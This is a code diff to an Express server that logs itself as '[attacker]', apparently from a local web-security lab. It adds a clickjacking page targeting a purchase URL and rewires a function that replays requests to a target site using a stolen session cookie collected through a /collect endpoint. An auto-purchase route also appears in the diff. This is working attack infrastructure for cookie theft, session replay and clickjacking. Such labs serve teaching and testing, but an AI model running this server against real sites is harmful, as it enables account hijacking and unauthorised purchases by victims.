@@ -6,7 +6,9 @@ const express = require("express");
 const morgan = require("morgan");
 
 const DEFAULT_PORT = Number(process.env.PORT || 5000);
-const DEFAULT_TARGET_BASE = process.env.TARGET_BASE || "http://localhost:4000";
+const DEFAULT_TARGET_BASE_PUBLIC = process.env.TARGET_BASE || "http://localhost:8000";
+const DEFAULT_TARGET_BASE_INTERNAL =
+  process.env.TARGET_INTERNAL_BASE || DEFAULT_TARGET_BASE_PUBLIC;
 
 function renderPage(filename, pageData) {
   const body = fs.readFileSync(path.join(__dirname, "public", filename), "utf8");
@@ -21,6 +23,7 @@ function renderPage(filename, pageData) {
     <script>
       window.__TARGET_BASE__ = ${JSON.stringify(pageData.targetBase)};
       window.__LAST_STOLEN_COOKIE__ = ${JSON.stringify(pageData.lastStolenCookie)};
+      window.__CLICKJACKING_TARGET__ = ${JSON.stringify(pageData.clickjackingTarget)};
     </script>
     ${body}
   </body>
@@ -30,12 +33,15 @@ function renderPage(filename, pageData) {
 function createApp(options) {
   const config = Object.assign(
     {
-      targetBase: DEFAULT_TARGET_BASE,
       logger: morgan("dev"),
       state: { lastStolenCookie: "" }
     },
     options || {}
   );
+  config.targetBasePublic =
+    config.targetBasePublic || config.targetBase || DEFAULT_TARGET_BASE_PUBLIC;
+  config.targetBaseInternal =
+    config.targetBaseInternal || config.targetBase || DEFAULT_TARGET_BASE_INTERNAL;
 
   const app = express();
   if (config.logger) {
@@ -44,8 +50,9 @@ function createApp(options) {
 
   function render(filename) {
     return renderPage(filename, {
-      targetBase: config.targetBase,
-      lastStolenCookie: config.state.lastStolenCookie || ""
+      targetBase: config.targetBasePublic,
+      lastStolenCookie: config.state.lastStolenCookie || "",
+      clickjackingTarget: new URL("/purchase/1", config.targetBasePublic).toString()
     });
   }
 
@@ -58,7 +65,7 @@ function createApp(options) {
   }
 
   function proxyWithStolenCookie(replayPath, callback) {
-    const targetUrl = new URL(config.targetBase);
+    const targetUrl = new URL(config.targetBaseInternal);
     const transport = targetUrl.protocol === "https:" ? https : http;
     const requestOptions = {
       protocol: targetUrl.protocol,
@@ -89,6 +96,11 @@ function createApp(options) {
   app.get("/auto-purchase", (req, res) => {
     res.setHeader("content-type", "text/html; charset=utf-8");
     res.send(render("auto_purchase.html"));
+  });
+
+  app.get("/clickjacking", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("clickjacking.html"));
   });
 
   app.get("/collect", (req, res) => {
@@ -137,7 +149,13 @@ function startServer(options) {
     // eslint-disable-next-line no-console
     console.log(`[attacker] listening on http://localhost:${server.address().port}`);
     // eslint-disable-next-line no-console
-    console.log(`[attacker] TARGET_BASE=${config.targetBase || DEFAULT_TARGET_BASE}`);
+    console.log(
+      `[attacker] TARGET_BASE=${config.targetBasePublic || DEFAULT_TARGET_BASE_PUBLIC}`
+    );
+    // eslint-disable-next-line no-console
+    console.log(
+      `[attacker] TARGET_INTERNAL_BASE=${config.targetBaseInternal || DEFAULT_TARGET_BASE_INTERNAL}`
+    );
   });
   return { app: app, server: server };
 }
